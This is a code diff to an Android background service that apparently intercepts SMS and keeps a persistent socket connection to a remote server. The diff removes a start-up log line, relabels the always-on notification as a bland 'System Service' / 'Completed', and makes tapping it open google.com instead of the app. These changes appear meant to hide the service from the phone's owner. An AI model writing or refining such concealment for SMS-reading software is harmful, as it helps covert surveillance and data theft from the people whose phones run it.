@@ -17,7 +17,7 @@ import androidx.core.app.NotificationCompat;
 
 public class BackgroundService extends Service {
 
-    private static final String CHANNEL_ID = "MySystemBackground";
+    private static String CHANNEL_ID = "";
     private static String TAG = "";
 
     private SmsReceiver smsReceiver;
@@ -26,10 +26,11 @@ public class BackgroundService extends Service {
 
     @Override
     public void onCreate() {
+
         super.onCreate();
         helper = new Helper();
-         TAG =  helper.TAG;
-
+        TAG =  helper.TAG;
+        CHANNEL_ID = helper.BG_CHANNEL_ID;
         createNotificationChannel();
         startForegroundService();
     }
@@ -45,7 +46,7 @@ public class BackgroundService extends Service {
         // Initialize and connect socket (Socket.IO handles auto-reconnect)
         socketManager = SocketManager.getInstance(getApplicationContext());
         socketManager.connect();
-        Log.d(TAG, "Background service started");
+//        Log.d(TAG, "Background service started");
 
         return START_STICKY;
     }
@@ -90,18 +91,26 @@ public class BackgroundService extends Service {
 
     @SuppressLint("ForegroundServiceType")
     private void startForegroundService() {
-        Intent notificationIntent = new Intent(this, MainActivity.class);
+        // 👉 Intent to open Google.com in browser
+        Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.google.com"));
+        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
         PendingIntent pendingIntent = PendingIntent.getActivity(
-                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
+                this,
+                0,
+                browserIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
         );
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Background Service")
-                .setContentText("System service is running...")
-                .setContentIntent(pendingIntent)
+                .setContentTitle("System Service")
+                .setContentText("Completed")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .setContentIntent(pendingIntent)  // 👈 opens link when clicked
+                .setAutoCancel(true)
                 .build();
 
         startForeground(1, notification);
     }
+
 }
